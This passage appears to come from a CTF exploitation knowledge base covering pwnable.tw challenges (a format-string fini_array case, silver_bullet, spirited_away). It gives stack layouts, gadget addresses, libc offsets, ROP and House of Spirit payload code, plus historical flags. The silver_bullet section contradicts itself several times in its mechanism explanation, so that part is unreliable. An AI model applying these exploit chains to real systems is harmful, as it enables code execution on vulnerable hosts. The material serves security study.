2. **Constraint:** The `%hn` value equals `printf_ret & 0xffff`, which must be < 0x2000 (the stdio buffer cap). This means the stack page nibble must be 0 → **1/16**. The low 12 bits of the stack are also randomized → **1/256** additional guess (since return address is 16-byte aligned, low nibble is fixed → 8 bits of entropy).

3. **Subsequent payloads:** Now looping, use positional `%53$hhn` to keep overwriting the return address each iteration. Swap `stdout→stderr` (1/16 if not already done), leak libc/stack, and write a ROP chain or one-gadget to the return address.

**Probability:** 1/4096 to 1/65536 per connection depending on variant.

---

##### Path C — `_dl_fini` Hijack → BSS ROP Chain (No Leak Needed)

**Used by:** Solutions 2311 (no-brute version), 2972, 8153

**Concept:** Instead of leaking libc, build a multi-stage ROP chain entirely from the No-PIE binary's gadgets (`__libc_csu_init` pop/call gadgets) to achieve `execve("/bin/sh", 0, 0)`.

**Steps:**

1. **Gain printf loop** via Path A's `fini_array` hijack.

2. **Write ROP chain byte-by-byte into `.bss`** using repeated format string iterations. Each iteration writes one non-zero byte via `%hhn` to a specific `.bss` address.

3. **Pivot:** Overwrite printf's return address with `pop rsp; pop r13; pop r14; pop r15; ret` (`0x4009bd`), targeting `.bss`.

4. **ROP chain uses `__libc_csu_init` gadgets** to call `read(0, bss, large)` for a second-stage payload, then partial-overwrite a libc address in the GOT/stack to create a `syscall` gadget, and finally `execve("/bin/sh", 0, 0)`.

**Probability:** Deterministic after the 1/16 `fini_array` shift alignment, or fully deterministic if `l_addr` manipulation is precise.

---

##### Path D — One-Shot: Partial Overwrite `stdin@bss` to One-Gadget via Atexit

**Used by:** Solutions 11177, 6748

**Concept:** The `exit()` path goes through `__run_exit_handlers` which uses an `atexit` function list. A pointer on the stack (accessible via `%42$`) influences the atexit array offset. By overwriting this offset to point at `stdout@bss`, and then partial-overwriting the libc pointer at `stdout@bss` to a one-gadget, `exit()` jumps directly to the one-gadget.

**Steps:**

1. Overwrite the atexit offset (via `%42$`) to redirect the exit handler to `stdout@bss` (`0x601020`).
2. Partial-overwrite `stdout` pointer's low 3 bytes to a one-gadget address.
3. Brute-force the remaining 12 bits of libc entropy → **1/4096**.

**Probability:** 1/4096 per connection. Simpler payload, single-shot.

---

##### Path E — Fake FILE Struct → Vtable Hijack → One-Gadget

**Used by:** Solution 3498

**Concept:** After gaining a printf loop (via Path A or B), construct a fake `FILE` struct in `.bss` with a crafted vtable. Redirect `stdout@bss` to the fake struct. The vtable's `xsputn` entry points to a `add byte ptr [rax], al` gadget that is repeatedly invoked by `printf`'s `buffered_vfprintf` path, incrementally transforming `stdin@bss` into a one-gadget address.

**Steps:**

1. Gain printf loop.
2. Build fake FILE struct in `.bss` with `flags = 0x8002`, vtable pointing to gadgets.
3. Swap `stdout` to the fake struct.
4. Invoke the `add [rax], al` gadget ~58 times, each time it adds `al` to `[rax]` where `rax = stdin@bss`, slowly morphing the libc pointer into a one-gadget.
5. When the pointer matches, the next `printf` triggers the one-gadget.

**Probability:** Depends on initial libc layout; additional nibble guessing may be needed.

#### Key Addresses (No-PIE Binary)

```python
# Binary
main_read_printf = 0x400925    # read(0,buf,0x80); printf(buf) — loop target
fini_array       = 0x600db8    # .fini_array (read-only segment)
bss_start        = 0x601000    # writable .bss
stdout_bss       = 0x601020    # copy-relocated stdout
stdin_bss        = 0x601030    # copy-relocated stdin
stderr_bss       = 0x601040    # copy-relocated stderr

# Gadgets
pop_rdi          = 0x4009c3    # pop rdi; ret
pop_rsi_r15      = 0x4009c1    # pop rsi; pop r15; ret
pop_rsp_3        = 0x4009bd    # pop rsp; pop r13; pop r14; pop r15; ret (stack pivot)
csu_pop6         = 0x4009ba    # pop rbx; rbp; r12; r13; r14; r15; ret
csu_call         = 0x4009a0    # call [r12+rbx*8](r15, r14, r13)
ret              = 0x4009c4    # ret
```

#### Offsets (pwnable.tw `libc_64.so.6`, glibc 2.23)

```python
_IO_2_1_stderr_      = 0x3c4540
_IO_2_1_stdout_      = 0x3c4620
__libc_start_main_ret = 0x20830
system               = 0x45390
bin_sh               = 0x18c177
one_gadgets          = [0x4526a, 0xef6c4, 0xf0567]
```

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Format string (blind) | `printf(buf)` after `close(1)` | Deterministic |
| Printf loop | `fini_array` hijack or stack retarget | 1/16 (fini) or 1/4096 (stack) |
| Restore output | `stdout@bss` → `_IO_2_1_stderr_` partial overwrite | 1/16 (libc nibble) |
| libc leak | `%25$p` or `%60$p` (once output restored) | Deterministic |
| Stack leak | `%23$p` or `%11$p` | Deterministic |
| Code execution | ROP chain / one-gadget on printf return address | Deterministic after leaks |
### Assets and Provenance

Source write-up IDs, primary paths, technique notes, solution counts, exploit names, artifact descriptions, and provenance are retained.

#### Solution Write-ups

| File | Primary Path | Key Technique | Probability | Notes |
|------|-------------|---------------|-------------|-------|
| `821.md` | B | Sequential fmt → stack retarget → one-gadget | 1/4096 | Brute force stack guess |
| `1351.md` | A | `l_addr` hijack → stdout→stderr → leak → one-gadget | 1/16 | Uses link_map pointer |
| `2311.md` | B + C | Sequential fmt → BSS ROP (no leak) + deterministic variant | 1/4096 or det. | Two scripts: brute + no-brute |
| `2972.md` | A + C | `fini_array` → BSS ROP via `__libc_csu_init` | ~1/16 | `mprotect` + shellcode |
| `3148.md` | A | `fini_array` → leak → one-gadget on stack | 1/16 | Concise; direct one-gadget write |
| `3498.md` | E | Fake FILE vtable → `add [rax], al` × N → one-gadget | 1/4096 | Most creative approach |
| `3568.md` | A | stdout→stderr → leak → fmt write one-gadget | 1/16 | Chinese writeup |
| `6748.md` | D | Atexit → partial overwrite stdin to one-gadget | 1/4096 | Brute 12 bits libc |
| `7905.md` | B | Sequential trick → loop → ROP | 1/65536 | Most detailed analysis |
| `8153.md` | A | `l_addr` + stdout swap → leak + `add rsp` ROP | 1/16 | Clean multi-stage; detailed writeup |
| `11177.md` | D | Atexit offset → partial overwrite | 1/4096 | Size-optimized fmt writer |
| `15724.md` | B | Stack retarget → leak → one-gadget | 1/16 | Stack + libc leak in one shot |
| `22319.md` | B | Stack pivot → `__libc_csu_init` ROP → `syscall` | 1/4096 | No libc leak needed |
| `24887.md` | A | `fini_array` → leak → fmt write one-gadget | 1/16 | Uses formatstring library |
| `31599.md` | A | `fini_array` → leak → `add rsp` gadget + inline ROP | 1/16 | Exp.py approach |
| `35917.md` | A | `_dl_fini` analysis → `fini_array` shift | 1/16 | Detailed reverse engineering |
| `36233.md` | A | `fini_array` + stdout→stderr → leak → `add rsp, 0x80` ROP | 1/16 | Detailed Chinese writeup |
| `38641.md` | A | `fini_array` → stdout swap → leak → `add rsp` + ROP | 1/16 | Clean exploit |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (Path A: `fini_array` + stdout swap + ROP) |
| `desc.txt` | Challenge description |
| `solution/*.md` | Community write-ups (47 solutions) |


## silver_bullet
> **Canonical route:** `strncat` off-by-null state corruption → Length mismatch overflow, ret2plt leak, BSS pivot, and GOT write
> **Read this case when:** Charging a bullet uses `strncat`, whose NUL corrupts an adjacent tracked power field.
> **Primary defect:** `strncat` off-by-null state corruption
> **Exploit primitive/result:** Length mismatch overflow, ret2plt leak, BSS pivot, and GOT write
> **Search terms:** silver bullet; power; `strncat`; off-by-one/NUL; ret2plt; BSS pivot
> **Version/protection clue:** Case target `silver_bullet` — i386, glibc 2.23, Partial RELRO, NX, no canary/PIE
> **Variant boundary:** Standalone; the tracked length state is the bug, so generic overflow sizing is wrong.

### Metadata

```yaml
tags:
  - off-by-one
  - stack-buffer-overflow
  - ret2libc
platform: pwnable.tw
points: 200
arch: i386
libc: glibc-2.23
relro: partial
canary: no
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "A strncat off-by-one error overwrites the bullet power integer with zero, allowing a second input to overflow the stack frame into ret2libc."
proof-of-concept: no
```

Historical service/flag:
> `nc chall.pwnable.tw 10103`
>
> Flag: `FLAG{Silver_Bullet_Is_Not_Enough_QQ}`

Source title: Silver Bullet — pwnable.tw (200 pts)
Source record: `/home/hungnt/pwn-knowledge-base/linux-userland-ctf/pwnable.tw/silver_bullet/README.md`.

### Facts

Source facts are preserved below without paraphrase-induced loss; source headings are demoted to H4/H5.

#### Challenge Overview

A 32-bit werewolf-slaying game (i386, no PIE, no canary, NX, Partial RELRO) built against glibc 2.23. The player creates a "silver bullet" with a text description, can power it up by appending more text, then attempts to beat a werewolf whose HP is 0x7FFFFFFF. The bullet's "power" (stored as a 32-bit integer immediately after the 0x30-byte description buffer on the stack) determines damage dealt. The game loops in `main` until the werewolf is killed or the player quits.

```text
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    No canary found
  NX:       NX enabled
  PIE:      No PIE               # fixed addresses
```

#### Program Structure

```text
main() loop:
  1. Create bullet   → read_input(desc, 0x30); power = strlen(desc)
  2. Power up bullet  → strncat(desc, new, 0x30 - power); power += strlen(new)
  3. Beat werewolf    → hp -= power; if hp <= 0: "You win!!", return
  4. Exit
```

##### Stack Layout of `main`

| Offset from EBP | Field |
|------------------|-------|
| `-0x34` | `desc[0x30]` — bullet description buffer |
| `-0x04` | `power` — 32-bit integer (bullet damage) |
| `+0x00` | saved EBP |
| `+0x04` | saved return address |

#### Vulnerabilities

##### V1 — `strncat` Off-by-One NUL Byte Overwrites Power Field (Primary, Exploitable)

**Root Cause:** `power_up()` uses `strncat(desc, new_input, 0x30 - power)` to append to the description. `strncat` always writes a terminating NUL byte **after** the last copied character. When the total description length reaches exactly `0x30`, the NUL lands at `desc[0x30]` — which is the **low byte of the `power` field**.

```c
// power_up (decompiled, simplified)
void power_up(char *desc, int *power) {
    char new_desc[0x30];
    memset(new_desc, 0, 0x30);
    read_input(new_desc, 0x30 - *power);  // read up to remaining space
    strncat(desc, new_desc, 0x30 - *power);
    // ^^^ NUL terminator lands at desc[strlen(desc)] which may be desc[0x30]
    //     This is power's low byte!
    *power = strlen(desc);  // recompute: now sees past the NUL'd power field
}
```

**Trigger sequence:**
1. `create_bullet("A" * 0x2f)` → `power = 0x2f`, `desc` has 0x2f bytes.
2. `power_up("\xff")` → `strncat` appends 1 byte + NUL. The NUL lands on `power`'s low byte, zeroing it. Then `power = strlen(desc)` scans from `desc[0]` through the NUL at `desc[0x30]` and keeps going, finding `\xff` (non-NUL) and whatever is after. The effective `power` becomes **1** (just the new byte, since `strlen` restarts from the power field perspective — actually `power = strlen(desc) = 0x30` but the old power was NUL'd so `0x30 - power` in the *next* call uses the newly computed value).

Wait — the precise mechanics: after step 2, `strlen(desc)` returns `0x30` (the full 0x2f A's + 1 `\xff`). But `power` was overwritten to have its low byte = 0, so the stored `power` was `0x00` (or `0x??00`). Then it gets recomputed: `*power = strlen(desc)` → stored as `0x30`. **But**: for the *next* `power_up` call, `0x30 - 0x30 = 0`, so no more bytes can be appended.

The actual trick (as the exp.py shows): After step 2, `power`'s low byte is NUL'd → `power` becomes some small value (often 0 or 1, depending on residual bytes). `strlen(desc)` is called and stored back, giving `power = 0x30`. However, `strlen(desc)` actually returns `0x30` because `strncat` wrote `\xff\x00` making total = `0x2f + 1 = 0x30`. So `power = 0x30` and `0x30 - 0x30 = 0`.

**Actual mechanism from exp.py and all solutions:** The key insight is:

1. Create with exactly `0x2f` bytes → `power = 0x2f`.
2. Power up with 1 byte (`\xff`) → `strncat` appends `\xff\x00`. The `\x00` lands at byte offset `0x30`, which is the low byte of `power`. Now `power`'s low byte = 0. `strlen(desc)` is called: it returns `0x30` (the `\xff` was at index `0x2f`, but `\x00` at `0x30` terminates). The code does `*power = strlen(new) + strlen(desc)` — wait, let me re-read the actual decompilation.

Looking at the exp.py comment more carefully:
> Create a bullet whose description length is exactly 0x2f, then power_up with a single byte: the off-by-one NUL lands on the low byte of the power field, which is then recomputed to 1. Now strlen(desc) (== 0x31) and the tracked power (== 1) disagree, so the next power_up's strncat appends starting at desc[0x31].

So the actual flow is:
1. `create("A"*0x2f)` → power = 0x2f.
2. `power_up("\xff")` → `strncat(desc, "\xff", 0x30 - 0x2f = 1)`. Copies 1 byte + NUL. NUL overwrites `power` low byte → power = 0. Then `power += strlen("\xff") = 1`. So **power = 1**. But `strlen(desc) = 0x30`. The next `power_up` does `strncat(desc + strlen_pos, new, 0x30 - 1 = 0x2f)`. Since `strncat` starts appending at `desc[strlen(desc)]` = `desc[0x30]` (which is now `\x00` in the power field), it overwrites power and everything beyond it.

Actually the code does:
```c
strncat(desc, new, 0x30 - *power);  // 0x30 - 1 = 0x2f bytes allowed
*power += strlen(new);
```

But `strncat` appends at the first NUL in `desc`. Since `desc[0x30]` is `\x00` (the NUL we just wrote), `strncat` finds it and starts writing there — past the description buffer into the power field, saved EBP, and return address.

**Impact:** Stack buffer overflow of up to `0x2f` bytes past `desc[0x30]`, overwriting:
- Bytes 0-3: `power` field (set to `\xff\xff\xff\x??` → large negative value so `beat()` wins)
- Bytes 4-7: saved EBP
- Bytes 8-11: **saved return address** of `main`
- Bytes 12+: ROP chain arguments

##### V2 — No Stack Canary + No PIE (Enabler)

The binary has **no stack canary** and is **not position-independent**, making the off-by-one directly exploitable:
- No canary to bypass between the buffer and return address.
- Fixed addresses for PLT entries, GOT entries, and gadgets — no info leak needed for the first ROP stage.

##### V3 — Partial RELRO (Enabler)

GOT is writable, so solutions that use `read` to overwrite GOT entries (e.g., overwrite `puts@GOT` with `system`) are viable, though most solutions prefer a simpler ret2libc approach.

#### Key Binary Addresses (No PIE)

```python
# PLT
puts_plt     = 0x080484A8
printf_plt   = 0x08048498
read_plt     = 0x08048490

# GOT
puts_got     = 0x0804AFDC
read_got     = 0x0804AFD0
exit_got     = 0x0804AFE4
printf_got   = 0x0804AFD4
__libc_start_main_got = 0x0804AFEC

# Functions
main         = 0x08048954
_start       = 0x080484F0
read_input   = 0x080485EB

# Gadgets
pop_ebx_ret  = 0x08048475
pop_ebp_ret  = 0x08048A7B
pop3_ret     = 0x08048A79   # pop esi; pop edi; pop ebp; ret
leave_ret    = 0x08048641   # or 0x08048952
```

### Exploit Paths

All source paths, variants, reliability notes, diagrams, addresses, offsets, and non-exploitable findings are retained.

#### Exploit Paths

All 195 solutions exploit V1 (strncat off-by-one). They diverge on ROP chain construction and leak strategy.

---

##### Path A — ret2plt Leak + ret2libc (Most Common)

**Used by:** ~90% of all solutions (138, 144, 100, 1006, 1155, 1220, 1251, 1269, 1351, 1384, 1395, 1428, 10840, 14106, etc.)

**Strategy:** Two-pass exploit. First pass leaks a libc address, second pass calls `system("/bin/sh")`.

**Stage 1 — Leak libc:**
```text
create("A" * 0x2f)
power_up("\xff")                      # off-by-one: power → 1
power_up("\xff"*7 + ROP_LEAK)         # overflow: power(neg) + EBP + ret
beat() [+ beat()]                     # win → main returns into ROP
```

ROP chain for leak:
```python
ROP_LEAK = p32(puts_plt) + p32(main) + p32(puts_got)
#          puts(puts@GOT)   return     argument
```

After `main` returns, `puts` prints the resolved address of `puts` from the GOT. Then execution returns to `main` for a fresh round.

**Stage 2 — Shell:**
```python
ROP_SHELL = p32(system) + p32(0xdeadbeef) + p32(bin_sh)
#           system("/bin/sh")  dummy ret    argument
```

Repeat the overflow with the computed libc addresses.

**Variant — Different leak targets:** Solutions leak different GOT entries depending on preference:
- `puts@GOT` (most common)
- `read@GOT`
- `printf@GOT`
- `exit@GOT`
- `__libc_start_main@GOT`
- `stdin` (FILE* in BSS at `0x804b020`)

**Variant — pop;ret cleanup:** Some solutions use `pop ebx; ret` (0x08048475) or `pop ebp; ret` (0x08048a7b) between the leak call and the return-to-main to properly clean up arguments from the stack.

---

##### Path B — Stack Pivot to BSS (Advanced)

**Used by:** Solutions 1316, 278, 799, 2693, 59, 10178

**Motivation:** The overflow window is limited to ~0x2f bytes after `desc[0x30]`. For longer ROP chains (e.g., chaining `read_input` to get arbitrary-length second-stage payloads), solvers pivot the stack to a writable BSS region.

**Steps:**
1. Overflow to set saved EBP to a BSS address and return to `read_input(bss_addr, large_len)`.
2. Use a `leave; ret` gadget to pivot ESP to the BSS.
3. Send a second-stage ROP payload via `read_input` with no size constraints.
4. The second stage leaks libc (e.g., `puts(read@GOT)`) then calls `read` again for a third stage.
5. Third stage calls `system("/bin/sh")`.

```python
# Stage 1: pivot
payload = "\xff"*3 + p32(bss_addr)      # power + new EBP
payload += p32(read_input)               # ret → read_input(bss, len)
payload += p32(leave_ret)                # after read, pivot to bss
payload += p32(bss_addr) + p32(0x100)    # read_input args
```

**Advantage:** Unlimited ROP chain length; can chain multiple calls.
**Disadvantage:** More complex; unnecessary for this challenge since the simpler 2-pass approach works.

---

##### Path C — GOT Overwrite via `read` (Rare)

**Used by:** Solutions 100, 1006, 13060

**Strategy:** Instead of returning to `main` after the leak, chain a `read(0, got_entry, 4)` call to overwrite a GOT entry (e.g., `puts@GOT`) with `system`'s address. Then trigger the overwritten function with a controlled argument.

```python
# After leaking, ROP chain calls read(0, puts_got, 4) then returns to
# code that calls puts("/bin/sh") which is now system("/bin/sh")
ROP = p32(puts_plt) + p32(pop_ret) + p32(puts_got)  # leak
ROP += p32(read_plt) + p32(main) + p32(0) + p32(puts_got) + p32(4)  # overwrite
```

Then send `p32(system_addr)` to overwrite the GOT entry.

---

##### Path D — `read_input` + `leave;ret` Chaining (Elegant)

**Used by:** Solutions 278, 2693, 10178

Similar to Path B but specifically uses the binary's own `read_input` function combined with `leave; ret` to build an arbitrary-length chain in BSS with clean control flow.

```python
# Overflow → read_input(fake_stack, 0xff) → leave;ret
# Then from fake_stack: puts(got_entry) → read_input(fake_stack2, 0xff) → leave;ret
# Then from fake_stack2: system("/bin/sh")
```

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Off-by-one NUL on `power` | V1: strncat at boundary | 100% deterministic |
| Stack overflow (~0x2f bytes) | V1: strncat with desync'd power | 100% deterministic |
| libc leak via GOT | ret2plt (puts/printf) | 100% deterministic |
| Return to main | Fixed `main` address (no PIE) | 100% deterministic |
| Code execution | `system("/bin/sh")` via ret2libc | 100% deterministic |

#### Offsets (pwnable.tw `libc_32.so.6`, glibc 2.23)

```python
puts        = 0x5F140
system      = 0x3A940
bin_sh      = 0x158E8B   # "/bin/sh" string
read        = 0xD41C0
printf      = 0x49020
exit        = 0x2E7B0
__libc_start_main = 0x18540
```
### Assets and Provenance

Source write-up IDs, primary paths, technique notes, solution counts, exploit names, artifact descriptions, and provenance are retained.

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `59.md` | B | Stack pivot to BSS + `read_input` + `leave;ret` | Uses pwntools ROP; elegant pivot |
| `100.md` | A + C | `puts` leak → `read` GOT overwrite | Chains read to overwrite GOT |
| `138.md` | A | `puts` leak → `system` | Ruby; two-pass ret2libc |
| `144.md` | A | `puts` leak → `system` | Python; beat() called twice |
| `278.md` | D | `read_input` + BSS stack pivot | Ruby; multi-stage pivot |
| `799.md` | B | BSS pivot via `call read` gadget | Three-stage BSS chain |
| `1006.md` | A | `puts` leak → `system` | Minimal; direct approach |
| `1155.md` | A | `stdin` FILE* leak → `system` | Leaks `_IO_2_1_stdin_` instead of GOT |
| `1220.md` | A | `puts` leak → `system` | Clean helper functions |
| `1251.md` | A | `usleep@GOT` leak → `system` | Leaks usleep, uses `pop;ret` |
| `1269.md` | A | `puts` leak → `system` | Uses `pop ebp; ret` for stack cleanup |
| `1316.md` | B | Stack pivot + `read_input` + `leave;ret` | Reads to BSS, pivots, calls system |
| `1351.md` | A | `exit@GOT` leak → `system` | Leaks exit address |
| `1384.md` | A | `printf` leak → `system` | Uses printf@plt instead of puts |
| `1395.md` | A | `read@GOT` leak → `system` | Leaks read; dual beat() |
| `1428.md` | A | `puts` leak → `system` | Straightforward |
| `2693.md` | D | `read_input` + BSS pivot + async | Python asyncio; clean pivot |
| `10128.md` | A | `printf` leak → `system` | Uses pwntools auto-ROP |
| `10178.md` | A | `puts` leak + `read_input` pivot | Uses ptrlib |
| `10840.md` | A | `puts` leak → `system` | Minimal modern pwntools |
| `11540.md` | A | `__libc_start_main` leak → `system` | Leaks via start_got |
| `12245.md` | A | `read@GOT` leak → `system` | Chinese writeup; explains NUL overwrite |
| `13060.md` | A + C | `read` leak + GOT overwrite → `system` | `read_input` to overwrite GOT + `read_int` for dispatch |
| `14106.md` | A | `exit` leak + `read_int` dispatch | Creative: uses read_int as jump trampoline |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (pure sockets, no pwntools) |
| `desc.txt` | Challenge description |
| `artifacts/silver_bullet` | Original challenge binary (i386, not stripped) |
| `artifacts/libc_32.so.6` | Remote libc (glibc 2.23, i386) |
| `solution/*.md` | Community write-ups (195 solutions) |


## spirited_away
> **Canonical route:** `sprintf` count/state spill → Oversized comment overwrites heap name pointer; fake stack chunk and ret2libc
> **Read this case when:** A comment-count conversion spills into recorded name length and requires 100 prior comments.
> **Primary defect:** `sprintf` count/state spill
> **Exploit primitive/result:** Oversized comment overwrites heap name pointer; fake stack chunk and ret2libc
> **Search terms:** spirited away; comment count; `sprintf`; name pointer; fake `0x40`; House of Spirit
> **Version/protection clue:** Case target `spirited_away` — i386, glibc 2.23, Partial RELRO, canary/NX, no PIE
> **Variant boundary:** Standalone; reach exactly 100 comments before the exploitation iteration.

### Metadata

```yaml
tags:
  - house-of-spirit
  - stack-buffer-overflow
  - ret2libc
platform: pwnable.tw
points: 300
arch: i386
libc: glibc-2.23
relro: partial
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "An off-by-one size error enables forging fake chunk headers on the stack, triggering House of Spirit via free() to overwrite the return address."
proof-of-concept: no
```

Historical service/flag:
> `nc chall.pwnable.tw 10204`
>
> Flag: `FLAG{Gue55_the_answer_isn't_always_Y3S}`

Source title: Spirited Away — pwnable.tw (300 pts)
Source record: `/home/hungnt/pwn-knowledge-base/linux-userland-ctf/pwnable.tw/spirited_away/README.md`.

### Facts

Source facts are preserved below without paraphrase-induced loss; source headings are demoted to H4/H5.

#### Challenge Overview

A 32-bit movie comment survey program (i386, no PIE, Partial RELRO, NX, Stack Canary) built against glibc 2.23. In a loop, the user is asked for name, age, reason, and comment. After each entry, they can choose to leave another comment. A global counter tracks total comments.

```text
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE (0x8048000)
```

#### Program Logic (Pseudocode)

```c
void survey() {
    char sprintf_buf[0x38];     // ebp-0xe8
    uint32_t name_comment_len;  // ebp-0xb0, initialized to 0x3c (60)
    uint32_t reason_len;        // ebp-0xac, initialized to 0x50 (80)
    char reason[0x50];          // ebp-0xa8 .. ebp-0x58
    char comment[0x3c];         // ebp-0x58 .. ebp-0x1c (approx)
    char *name_ptr;             // ebp-0x54 (malloc'd heap pointer)

    name_comment_len = 0x3c;
    reason_len = 0x50;

    while (1) {
        name_ptr = malloc(0x3c);
        read(0, name_ptr, name_comment_len);     // name
        scanf("%d", &age);                         // age
        read(0, reason, reason_len);               // reason
        read(0, comment_buf, name_comment_len);    // comment (reuses name_comment_len!)

        printf("Name: %s\nReason: %s\n...", name_ptr, reason);

        // BUG: sprintf can overflow into name_comment_len
        sprintf(sprintf_buf, "%d comment so far. We will review ...", ++cnt);

        free(name_ptr);

        read(0, &choice, 1);
        if (choice == 'n') return;  // returns to main → exit
    }
}
```

#### Vulnerabilities

##### V1 — `sprintf` Overflow Corrupts `name_comment_len` (Primary, Exploitable)

**Root Cause:** The `sprintf_buf` at `ebp-0xe8` is ~56 bytes, and the `name_comment_len` variable sits at `ebp-0xb0`. The sprintf format string `"%d comment so far. We will review them as soon as we can"` is 57+ characters. When `cnt` grows from 1 digit to 2 digits (count=10), the NUL terminator spills onto `name_comment_len`, setting it to **0**. When `cnt` reaches 3 digits (count=100), the trailing `"...can\0"` writes `'n' = 0x6e` (110) into `name_comment_len`.

```text
sprintf_buf layout (cnt=100):
  ebp-0xe8: "100 comment so far. We will review them as soon as we can\0"
                                                                    ^
                                                          ebp-0xb0 = 0x6e ('n')
```

**Phase 1 (cnt 10–99):** `name_comment_len = 0` → name and comment `read()` calls consume 0 bytes (effectively skipped). Age and reason still work normally.

**Phase 2 (cnt ≥ 100):** `name_comment_len = 0x6e` (110) → name and comment reads are now **much larger** than the original 0x3c (60). The comment buffer is only ~60 bytes before reaching the `name_ptr` variable on the stack → **comment read overflows into `name_ptr`**.

**Impact:** The attacker controls the `name_ptr` (heap pointer) that gets `free()`'d and then `malloc()`'d on the next iteration. This enables **House of Spirit**: point `name_ptr` at a fake fastbin chunk on the stack, free it, then malloc returns a stack pointer — the next name read writes directly to the stack.

##### V2 — `printf("%s", reason)` Leaks Stack/libc (Exploitable)

**Root Cause:** The `reason` buffer at `ebp-0xa8` is read with `read(0, reason, 0x50)` but never NUL-terminated. `printf("Reason: %s", reason)` prints past the 0x50 bytes into whatever follows on the stack.

```text
Stack layout after reason buffer:
  ebp-0xa8: reason[0x50]
  ebp-0x58: ... (comment area / other locals)
  ...
  ebp+0x00: saved_ebp          ← leaked (stack address)
  ebp+0x04: saved_eip = 0x08048908  ← leaked (return into main, constant)
  ebp+0x08: stdout FILE*       ← leaked (libc address)
```

**Impact:** By filling reason with exactly 0x50 bytes (no newline), the `%s` format leaks:
- **`saved_ebp`** → stack address (used to calculate the fake chunk target)
- **`0x08048908`** → anchor value (survey's return address into main, confirms alignment)
- **`stdout` (`_IO_2_1_stdout_`)** → libc address (subtract known offset → libc base)

Some solvers get a shorter leak by filling reason with fewer bytes (e.g., 56 bytes to only leak the libc pointer through `_IO_file_sync`/`fflush` residue), depending on exact stack layout.

##### V3 — Heap Pointer on Stack → House of Spirit (Enabler)

The `name_ptr` variable at `ebp-0x54` holds a `malloc`'d pointer that is `free()`'d each iteration and re-`malloc()`'d at the start of the next. Since V1 lets us overwrite `name_ptr` via the comment overflow, we can:

1. Point `name_ptr` at a **fake fastbin chunk** we've placed in the `reason` buffer on the stack
2. The subsequent `free(name_ptr)` inserts this fake chunk into the 0x40 fastbin
3. The next `malloc(0x3c)` returns the stack address
4. The next `read(0, name_ptr, 0x6e)` writes up to 110 bytes starting from the stack fake chunk → overwrites `saved_eip`

#### Exploit Flow (All Solutions)

Every solution follows the same fundamental chain. Differences are minor (leak offsets, padding, one_gadget vs ret2libc).

##### Step 1 — Leak Stack + libc (Iteration 1)

Fill `reason` with 0x50 bytes (or a shorter marker + padding). Read back the `%s` leak to extract `saved_ebp` (stack) and `_IO_2_1_stdout_` (libc).

```python
# Fill reason fully → leak stack and libc
send_name("A")
send_age("1\n")
send_reason("A" * 0x50)      # no NUL terminator
send_comment("C")
# parse: saved_ebp, return_addr (0x08048908), stdout pointer
```

##### Step 2 — Overflow `name_comment_len` (Iterations 2–100)

Send 99 more comments to increment `cnt` from 1 to 100:
- Iterations 2–10: normal (len=0x3c), send all four fields
- Iterations 11–100: len=0 (NUL-overwritten), name and comment reads are skipped; only send age + reason + choice

```python
for i in range(2, 11):
    send_all_fields("a", "1\n", "x", "c"); send_choice("y")
for i in range(11, 101):
    # len=0: name/comment reads consume nothing
    send_age("1\n"); send_reason("x"); send_choice("y")
# cnt is now 100 → name_comment_len = 0x6e
```

##### Step 3 — Forge Fake Chunk + Redirect `name_ptr` (Iteration 101)

Place a fake 0x40 fastbin chunk in the `reason` buffer and overflow `name_ptr` via the now-oversized comment read:

```python
# Fake chunk in reason buffer (ebp-0xa8):
#   prev_size=0, size=0x41, data[0x38], next_size=0x41
reason = p32(0) + p32(0x41) + "X"*0x38 + p32(0) + p32(0x41)

# Overflow comment → overwrite name_ptr with address of fake chunk
comment = "Q"*0x54 + p32(fake_chunk_addr)

# Send and answer "y" → free(name_ptr) pushes fake chunk to fastbin
```

##### Step 4 — Stack Write → ret2libc / one_gadget (Iteration 102)

`malloc(0x3c)` returns the stack fake chunk. The name `read()` now writes 0x6e bytes onto the stack starting from the fake chunk, reaching `saved_eip`:

```python
# Overwrite saved_eip with system() and "/bin/sh" argument:
name = "A"*0x4c + p32(system) + p32(junk) + p32(binsh_addr)
send_name(name)
# ... fill remaining fields ...
send_choice("n")  # survey() returns → system("/bin/sh")
```

##### Alternative Finishes

| Technique | Description | Used by |
|-----------|-------------|---------|
| `ret2libc: system("/bin/sh")` | Classic 32-bit ret2libc with libc `/bin/sh` string | Most solutions |
| `one_gadget` | Single gadget (e.g., `0x3a819`, `0x5f065`) in saved_eip | 1006, 1727, 7905 |
| `ROP → read() → puts(GOT) → system()` | Multi-stage ROP to leak libc at runtime + pivot | 1913 |
| `"/bin/sh"` on stack | Place `/bin/sh` string on stack, point `system` arg there | 17048 |

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| libc leak (`_IO_2_1_stdout_`) | V2: `printf("%s", reason)` no NUL terminator | Deterministic |
| Stack leak (`saved_ebp`) | V2: same `%s` leak | Deterministic |
| `name_comment_len` corruption (0→0x6e) | V1: `sprintf` overflow at cnt=100 | Deterministic |
| `name_ptr` overwrite | V1-enabled comment overflow | Deterministic |
| Fake fastbin chunk (House of Spirit) | V3: forge chunk in reason buffer | Deterministic |
| Stack write (saved_eip overwrite) | malloc returns stack; name read overwrites ret | Deterministic |

#### Key Stack Layout

```text
ebp-0xe8: sprintf_buf[0x38]       ← "%d comment so far..."
ebp-0xb0: name_comment_len        ← overwritten by sprintf NUL/tail
ebp-0xac: reason_len (0x50)
ebp-0xa8: reason[0x50]            ← fake chunk placed here
ebp-0x58: comment/name_ptr area
ebp-0x54: name_ptr (heap)         ← overwritten via comment overflow
  ...
ebp+0x00: saved_ebp               ← leaked via V2
ebp+0x04: saved_eip (0x08048908)  ← overwritten to system() / one_gadget
ebp+0x08: stdout FILE*            ← leaked via V2 (libc anchor)
```
